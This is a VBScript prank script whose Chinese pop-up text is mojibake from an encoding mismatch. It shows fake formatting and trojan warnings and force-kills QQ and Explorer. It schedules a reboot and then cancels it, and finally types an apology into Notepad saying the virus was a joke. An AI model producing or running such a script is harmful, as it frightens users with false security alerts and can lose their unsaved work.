gsh=msgbox ("�Ѿ�׼���ø�ʽ����׼����ʼ��",vbyesno)
set s=createobject("wscript.shell")
wscript.sleep 1000
msgbox "��ʼ��ʽ������ �����������˰ɣ�ƭ���~"
wscript.sleep 1000
wscript.sleep 1000*100
msgbox "windows����һ��Ҫ���£����Զ����ء�"
wscript.sleep 3000
msgbox "ϵͳ��⵽WINDOWS�����������в������SXS.exe,�Ƿ����ɨ�裿",vbyesno
wscript.sleep 1000
msgbox "�ļ��� SXS.exe"+CHR(13)+"������ ���Ĳ��� "+chr(13)+"��ȫ���� ��Σ"+chr(13)+"���� ֱ��ɾ��"+chr(13)+"�������ͣ�ľ��",,"windowsɨ�踽��"
msgbox "�Ƿ���ֹ�䰲װ��",vbyesno
wscript.sleep 3000
msgbox "��ֹʧ�ܣ��������ǽ�Ƿ�����"
wscript.sleep 5000
msgbox "���ڳ���ǿ��ɾ����"
wscript.sleep 5000
msgbox "ʧ�ܣ�"
wscript.sleep 5000
msgbox "���ĵ���������Σ��֮�У���Ͽ�ɨ�財����"
wscript.sleep 10000
s.sendkeys "% n"
s.run "taskkill /im QQ.exe"
s.sendkeys "% n"
s.run "taskkill /im explorer.exe /f"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
msgbox "��ð���"
wscript.sleep 3000
msgbox "�ܸ��˼����㣡"
wscript.sleep 3000
msgbox "���ĵ��Կ����Ѿ���Ⱦ������",,"WINDOWS����ǽ����"
wscript.sleep 3000
msgbox "�ҿ�����ĵ����ˣ�"
wscript.sleep 3000
msgbox "���ţ����Ҹ���ػ�����~"
s.run "shutdown -r -t 120"
msgbox "���˰ɣ�"
msgbox "�������ػ�����"
s.run "shutdown -a"
msgbox "�ٸ���򿪼��±�д���ţ�Ȱ����ñ𶯣�Ҫ��Ȼ������ϵͳ����~"
s.run "notepad"
wscript.sleep 3000
s.sendkeys "Hello, I'm sorry I control your computer,"
wscript.sleep 3000
s.sendkeys " but the virus is false in, "
wscript.sleep 3000
s.sendkeys "only a joke, "
wscript.sleep 3000
s.sendkeys "please rest assured! "
wscript.sleep 3000
s.sendkeys "I no longer next "
wscript.sleep 3000
s.sendkeys "time so the whole you!"
wscript.sleep 3000
s.sendkeys" Goodbye!"
s.sendkeys"{enter}"
s.sendkeys"END"
wscript.sleep 1000
s.sendkeys"%{F4}"
msgbox "��ʾ���ղŵġ��������Ǽٵģ�ֻ��������������~"
s.run "explorer"